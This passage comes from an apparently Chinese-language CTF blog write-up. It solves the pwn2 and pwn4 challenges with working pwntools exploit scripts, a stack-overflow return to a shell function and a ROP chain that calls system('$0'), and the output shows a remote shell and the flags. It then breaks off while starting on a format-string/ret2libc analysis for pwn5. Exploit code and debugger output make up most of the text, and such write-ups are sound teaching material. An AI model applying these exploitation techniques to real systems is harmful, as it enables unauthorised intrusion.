&lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">"show copying"</span> and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from pwn2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> pwn2)</span><br><span class="line">(gdb) <span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x00000000004006c6 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00000000004006c7 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x00000000004006ca &lt;+4&gt;:	sub    rsp,0x30</span><br><span class="line">   0x00000000004006ce &lt;+8&gt;:	lea    rax,[rbp-0x30]</span><br><span class="line">   0x00000000004006d2 &lt;+12&gt;:	mov    edx,0x30</span><br><span class="line">   0x00000000004006d7 &lt;+17&gt;:	mov    esi,0x0</span><br><span class="line">   0x00000000004006dc &lt;+22&gt;:	mov    rdi,rax</span><br><span class="line">   0x00000000004006df &lt;+25&gt;:	call   0x400580 &lt;memset@plt&gt;</span><br><span class="line">   0x00000000004006e4 &lt;+30&gt;:	mov    rax,QWORD PTR [rip+0x200975]        <span class="comment"># 0x601060 &lt;stdout@@GLIBC_2.2.5&gt;</span></span><br><span class="line">   0x00000000004006eb &lt;+37&gt;:	mov    ecx,0x0</span><br><span class="line">   0x00000000004006f0 &lt;+42&gt;:	mov    edx,0x2</span><br><span class="line">   0x00000000004006f5 &lt;+47&gt;:	mov    esi,0x0</span><br><span class="line">   0x00000000004006fa &lt;+52&gt;:	mov    rdi,rax</span><br><span class="line">   0x00000000004006fd &lt;+55&gt;:	call   0x4005b0 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x0000000000400702 &lt;+60&gt;:	mov    rax,QWORD PTR [rip+0x200967]        <span class="comment"># 0x601070 &lt;stdin@@GLIBC_2.2.5&gt;</span></span><br><span class="line">   0x0000000000400709 &lt;+67&gt;:	mov    ecx,0x0</span><br><span class="line">   0x000000000040070e &lt;+72&gt;:	mov    edx,0x1</span><br><span class="line">   0x0000000000400713 &lt;+77&gt;:	mov    esi,0x0</span><br><span class="line">   0x0000000000400718 &lt;+82&gt;:	mov    rdi,rax</span><br><span class="line">   0x000000000040071b &lt;+85&gt;:	call   0x4005b0 &lt;setvbuf@plt&gt;</span><br><span class="line">--Type &lt;RET&gt; <span class="keyword">for</span> more, q to quit, c to <span class="built_in">continue</span> without paging--c</span><br><span class="line">   0x0000000000400720 &lt;+90&gt;:	mov    edi,0x400804</span><br><span class="line">   0x0000000000400725 &lt;+95&gt;:	call   0x400560 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040072a &lt;+100&gt;:	lea    rax,[rbp-0x30]</span><br><span class="line">   0x000000000040072e &lt;+104&gt;:	mov    edx,0x100</span><br><span class="line">   0x0000000000400733 &lt;+109&gt;:	mov    rsi,rax</span><br><span class="line">   0x0000000000400736 &lt;+112&gt;:	mov    edi,0x0</span><br><span class="line">   0x000000000040073b &lt;+117&gt;:	call   0x400590 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">   0x0000000000400740 &lt;+122&gt;:	mov    edi,0x400813</span><br><span class="line">   0x0000000000400745 &lt;+127&gt;:	call   0x400560 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040074a &lt;+132&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000040074f &lt;+137&gt;:	leave  </span><br><span class="line">   0x0000000000400750 &lt;+138&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
<p>可以看出读入的标准输入从rbp-0x30处写入，而64位返回地址一般位于rbp+8，因此写入0x38个字节后达到返回地址处（覆盖rbp）</p>
<p>编写shell脚本测试崩溃长度</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">cat crashtest.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..100&#125;;do</span><br><span class="line">    input=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c $i)</span><br><span class="line">    echo $input | ./pwn2</span><br><span class="line">    if [ $? -ne 0 ];then</span><br><span class="line">        echo "OOOOOps!!! input($input) of length $i crush this program!"</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">./crashtest.sh</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">say something?</span><br><span class="line">oh,that's so boring!</span><br><span class="line">./crashtest.sh: line 2: 25716 Done                    echo $input</span><br><span class="line">     25717 Segmentation fault      (core dumped) | ./pwn2</span><br><span class="line">OOOOOps!!! input(r7ebllcu4750mwxo5ikgtqer2v097sw12a26r7gov79ioaoijxx1oca9) of length 56 crush this program!</span><br></pre></td></tr></table></figure>
<p>编写脚本进行测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('114.116.54.89', 10003)</span></span><br><span class="line">print(sh.recvline())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b'A'</span> * <span class="number">0x38</span></span><br><span class="line">shell_addr = p64(<span class="number">0x400751</span>)  <span class="comment"># get_shell地址</span></span><br><span class="line"></span><br><span class="line">payload = padding + shell_addr</span><br><span class="line">print(<span class="string">"payload: "</span>, payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">python pwn2.py </span></span><br><span class="line">[+] Opening connection to 114.116.54.89 on port 10003: Done</span><br><span class="line">b'say something?\n'</span><br><span class="line">payload:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ\x07@\x00\x00\x00\x00\x00'</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">oh,that's so boring!</span><br><span class="line">tql~tql~tql~tql~tql~tql~tql</span><br><span class="line">this is your flag!</span><br><span class="line">flag&#123;n0w_y0u_kn0w_the_Stack0verfl0w&#125;[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line">[*] Interrupted</span><br></pre></td></tr></table></figure>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>checksec<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">checksec --file=pwn4 </span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols      No	0		2	pwn4</span><br></pre></td></tr></table></figure></p>
<p>rabin2<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">rabin2 -z pwn4 </span></span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type  string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x000007f8 0x004007f8 21  22   .rodata ascii Come on,try to pwn me</span><br><span class="line">1   0x0000080e 0x0040080e 19  20   .rodata ascii So~sad,you are fail</span><br><span class="line">2   0x00000828 0x00400828 42  43   .rodata ascii ok~you find me,but you can't get my shell'</span><br><span class="line">0   0x00001080 0x00601080 24  25   .data   ascii 87asdhf893HF*ry0395$sd)F</span><br><span class="line">1   0x00001099 0x00601099 6   7    .data   ascii Y)*SF)</span><br><span class="line">2   0x00001100 0x00601100 33  34   .data   ascii 4985y9y()DY)*YFG8yas08d976s08d7$0</span><br><span class="line">3   0x00001122 0x00601122 11  12   .data   ascii sadaDS&amp;*(7s</span><br><span class="line">4   0x00001180 0x00601180 21  22   .data   ascii 89Y*G(*YfGF0YF8f08yf8</span><br><span class="line">5   0x00001196 0x00601196 18  19   .data   ascii )a8s7d0$sd)D9gf-s)</span><br><span class="line">6   0x00001200 0x00601200 33  34   .data   ascii hhhhh, are you finding the binsh?</span><br><span class="line">7   0x00001280 0x00601280 19  20   .data   ascii sorry!nothing here!</span><br><span class="line">8   0x00001300 0x00601300 20  21   .data   ascii 23333333333333333333</span><br><span class="line"><span class="meta">$</span><span class="bash">rabin2 -I pwn4 </span></span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x400000</span><br><span class="line">binsz    5269</span><br><span class="line">bintype  elf</span><br><span class="line">bits     64</span><br><span class="line">canary   false</span><br><span class="line">class    ELF64</span><br><span class="line">compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib64/ld-linux-x86-64.so.2</span><br><span class="line">laddr    0x0</span><br><span class="line">lang     c</span><br><span class="line">linenum  false</span><br><span class="line">lsyms    false</span><br><span class="line">machine  AMD x86-64 architecture</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       false</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   false</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">sanitiz  false</span><br><span class="line">static   false</span><br><span class="line">stripped true</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure></p>
<p>r2查看函数，反汇编main<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x004005d0]&gt;</span><span class="bash"> pdf @main</span></span><br><span class="line">┌ 139: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           ; var void *buf @ rbp-0x10</span><br><span class="line">│           ; DATA XREF from entry0 @ 0x4005ed</span><br><span class="line">│           0x004006c6      55             push rbp</span><br><span class="line">│           0x004006c7      4889e5         mov rbp, rsp</span><br><span class="line">│           0x004006ca      4883ec10       sub rsp, 0x10</span><br><span class="line">│           0x004006ce      488d45f0       lea rax, [buf]</span><br><span class="line">│           0x004006d2      ba10000000     mov edx, 0x10               ; 16 ; size_t n</span><br><span class="line">│           0x004006d7      be00000000     mov esi, 0                  ; int c</span><br><span class="line">│           0x004006dc      4889c7         mov rdi, rax                ; void *s</span><br><span class="line">│           0x004006df      e89cfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)</span><br><span class="line">│           0x004006e4      488b05850c20.  mov rax, qword [obj.stdout] ; [0x601370:8]=0</span><br><span class="line">│           0x004006eb      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x004006f0      ba02000000     mov edx, 2                  ; int mode</span><br><span class="line">│           0x004006f5      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x004006fa      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x004006fd      e8aefeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x00400702      488b05770c20.  mov rax, qword [obj.stdin]  ; [0x601380:8]=0</span><br><span class="line">│           0x00400709      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x0040070e      ba01000000     mov edx, 1                  ; int mode</span><br><span class="line">│           0x00400713      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x00400718      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x0040071b      e890feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x00400720      bff8074000     mov edi, str.Come_on_try_to_pwn_me ; 0x4007f8 ; "Come on,try to pwn me" ; const char *s</span><br><span class="line">│           0x00400725      e836feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x0040072a      488d45f0       lea rax, [buf]</span><br><span class="line">│           0x0040072e      ba30000000     mov edx, 0x30               ; rdx ; size_t nbyte</span><br><span class="line">│           0x00400733      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│           0x00400736      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x0040073b      e850feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00400740      bf0e084000     mov edi, str.So_sad_you_are_fail ; rdi</span><br><span class="line">│                                                                      ; 0x40080e ; "So~sad,you are fail" ; const char *s</span><br><span class="line">│           0x00400745      e816feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x0040074a      b800000000     mov eax, 0</span><br><span class="line">│           0x0040074f      c9             leave</span><br><span class="line">└           0x00400750      c3             ret</span><br></pre></td></tr></table></figure></p>
<p>尝试0x18字节输入使程序崩溃<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./crashtest</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Come on,try to pwn me</span><br><span class="line">So~sad,you are fail</span><br><span class="line">./crashtest.sh: line 2: 18245 Done                    echo $input</span><br><span class="line">     18246 Segmentation fault      (core dumped) | ./pwn4</span><br><span class="line">OOOOOps!!! input(6pjkpjobr21b1ol71c29d4lf) of length 24 crush this program!</span><br></pre></td></tr></table></figure></p>
<p>列出函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x004005d0]&gt;</span><span class="bash"> afl</span></span><br><span class="line">0x004005d0    1 41           entry0</span><br><span class="line">0x004005a0    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x00400560    1 6            sym.imp.puts</span><br><span class="line">0x00400570    1 6            sym.imp.system</span><br><span class="line">0x00400580    1 6            sym.imp.memset</span><br><span class="line">0x00400590    1 6            sym.imp.read</span><br><span class="line">0x004005b0    1 6            sym.imp.setvbuf</span><br><span class="line">0x004006c6    1 139          main</span><br><span class="line">0x004006a0    8 134  -&gt; 90   entry.init0</span><br><span class="line">0x00400680    3 28           entry.fini0</span><br><span class="line">0x00400600    4 50   -&gt; 41   fcn.00400600</span><br><span class="line">0x00400528    3 26           fcn.00400528</span><br></pre></td></tr></table></figure></p>
<p>可以利用sym.imp.system函数获得shell，寻找调用处<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x00000000]&gt;</span><span class="bash"> axt @ sym.imp.system</span></span><br><span class="line">fcn.00400751 0x40075a [CALL] call sym.imp.system</span><br></pre></td></tr></table></figure></p>
<p>得到调用sym.imp.system的代码地址<code>0x40075a</code></p>
<p>sym.imp.system系统调用需要一个参数，寻找<code>/bin/sh</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ROPgadget --binary pwn4 --string <span class="string">'/bin/sh'</span></span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure></p>
<p>未果，在字符串中发现有一个<code>4985y9y()DY)*YFG8yas08d976s08d7$0</code>，可以通过<code>$0</code>作为参数，调用system，也可以获得shell<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ROPgadget --binary pwn4 --string <span class="string">'\$0'</span></span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000060111f : $0</span><br></pre></td></tr></table></figure></p>
<p>得到<code>$0</code>的地址为<code>0x000000000060111f</code></p>
<p>接下来需要将<code>$0</code>作为参数，64位程序中使用寄存器传参，从左向右依次用rdi、rsi、rdx、rcx、r8、r9来传递参数（参数个数大于等于7的时候，后面的参数依次入栈）; 32位程序使用栈传参，参数从右向左依次入栈</p>
<p>这里需要将<code>$0</code>的地址存入rdi中，查找可以得到<code>pop rdi;ret</code>处<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ROPgadget --binary pwn4 --only <span class="string">'pop|ret'</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007d0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007d2 : pop r15 ; ret</span><br><span class="line">0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007d3 : pop rdi ; ret</span><br><span class="line">0x00000000004007d1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400541 : ret</span><br></pre></td></tr></table></figure></p>
<p>其中<code>0x00000000004007d3 : pop rdi ; ret</code>符合需求</p>
<p>编写利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./pwn4')</span></span><br><span class="line">sh = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line">print(sh.recvline())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b'A'</span> * <span class="number">0x18</span></span><br><span class="line">rop = p64(<span class="number">0x4007d3</span>)  <span class="comment"># address of `pop rdi;ret`</span></span><br><span class="line">shell_str = p64(<span class="number">0x60111f</span>)  <span class="comment"># address of '$0'</span></span><br><span class="line">system_addr = p64(<span class="number">0x40075a</span>)  <span class="comment"># address of code calling sym.imp.system</span></span><br><span class="line"></span><br><span class="line">payload = padding + rop + shell_str + system_addr</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">python pwn4.py </span></span><br><span class="line">[+] Opening connection to 114.116.54.89 on port 10004: Done</span><br><span class="line">b'Come on,try to pwn me\n'</span><br><span class="line">b'AAAAAAAAAAAAAAAAAAAAAAAA\xd3\x07@\x00\x00\x00\x00\x00\x1f\x11`\x00\x00\x00\x00\x00Z\x07@\x00\x00\x00\x00\x00'</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">So~sad,you are fail</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /flag</span></span><br><span class="line">flag&#123;264bc50112318cd6e1a67b0724d6d3af&#125;$ </span><br><span class="line">[*] Interrupted</span><br></pre></td></tr></table></figure>
<p>这道题用到了ROP，在main函数中执行read()后，栈顶返回地址被改写为<code>pop rdi;ret</code>所在的地址。main函数执行ret时，跳转执行<code>pop rdi;ret</code>，此时栈顶存有<code>$0</code>的地址，执行<code>pop rdi</code>时地址被送入rdi中。随后又执行了<code>ret</code>，此时栈顶返回地址为调用system()的代码的地址，system()被调用。system()将rdi指向的内容作为参数，而字符串<code>$0\0</code>恰好位于整个字符串末尾，因而执行system(‘$0’)</p>
<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>checksec<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">checksec --file=human </span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols     No	0		3	human</span><br></pre></td></tr></table></figure></p>
<p>查看字符串<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">rabin2 -z human </span></span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type string</span><br><span class="line">――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x00000958 0x00400958 10  27   .rodata utf8 人类的本质是什么?\n blocks=CJK Unified Ideographs,Basic Latin</span><br><span class="line">1   0x00000978 0x00400978 11  32   .rodata utf8 一位群友打烂了复读机! blocks=CJK Unified Ideographs,Basic Latin</span><br><span class="line">2   0x00000998 0x00400998 10  27   .rodata utf8 \n人类还有什么本质? blocks=Basic Latin,CJK Unified Ideographs</span><br><span class="line">3   0x000009c8 0x004009c8 15  42   .rodata utf8 你并没有理解人类的本质,再见! blocks=CJK Unified Ideographs,Basic Latin</span><br><span class="line">4   0x000009f8 0x004009f8 17  46   .rodata utf8 人类的三大本质:复读机,真香,鸽子 blocks=CJK Unified Ideographs,Basic Latin</span><br></pre></td></tr></table></figure></p>
<p>列出函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x004006a0]&gt;</span><span class="bash"> afl</span></span><br><span class="line">0x004006a0    1 41           entry0</span><br><span class="line">0x00400640    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x004006d0    4 50   -&gt; 41   sym.deregister_tm_clones</span><br><span class="line">0x00400710    4 58   -&gt; 55   sym.register_tm_clones</span><br><span class="line">0x00400750    3 28           entry.fini0</span><br><span class="line">0x00400770    4 38   -&gt; 35   entry.init0</span><br><span class="line">0x00400940    1 2            sym.__libc_csu_fini</span><br><span class="line">0x00400944    1 9            sym._fini</span><br><span class="line">0x004008d0    4 101          sym.__libc_csu_init</span><br><span class="line">0x00400796    4 308          main</span><br><span class="line">0x004005d0    3 26           sym._init</span><br><span class="line">0x00400600    1 6            sym.imp.puts</span><br><span class="line">0x00400610    1 6            sym.imp.printf</span><br><span class="line">0x00400620    1 6            sym.imp.memset</span><br><span class="line">0x00400630    1 6            sym.imp.read</span><br><span class="line">0x00400650    1 6            sym.imp.setvbuf</span><br><span class="line">0x00400660    1 6            sym.imp.exit</span><br><span class="line">0x00400670    1 6            sym.imp.sleep</span><br><span class="line">0x00400680    1 6            sym.imp.strstr</span><br></pre></td></tr></table></figure></p>
<p>发现危险函数sym.imp.printf，存在格式化字符串漏洞。结合sym.imp.__libc_start_main函数，可以计算出libc的基地址，实现ret2libc</p>
<p>反汇编main函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 